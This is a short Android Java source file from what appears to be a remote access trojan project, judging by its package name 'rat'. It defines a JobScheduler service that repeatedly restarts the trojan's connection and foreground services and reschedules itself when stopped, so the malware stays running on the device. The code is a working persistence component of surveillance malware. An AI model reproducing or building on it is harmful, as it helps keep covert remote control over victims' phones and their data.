package com.fly0rakoon.rat.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.util.Log;

public class JobSchedulerService extends JobService {
    private static final String TAG = "JobSchedulerService";
    
    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "Job started");
        
        // Ensure ConnectionService is running
        Intent serviceIntent = new Intent(this, ConnectionService.class);
        startService(serviceIntent);
        
        // Also ensure ForegroundService is running
        Intent foregroundIntent = new Intent(this, ForegroundService.class);
        startService(foregroundIntent);
        
        // Job finished, reschedule
        jobFinished(params, true);
        return true;
    }
    
    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "Job stopped");
        return true; // Reschedule if stopped
    }
}
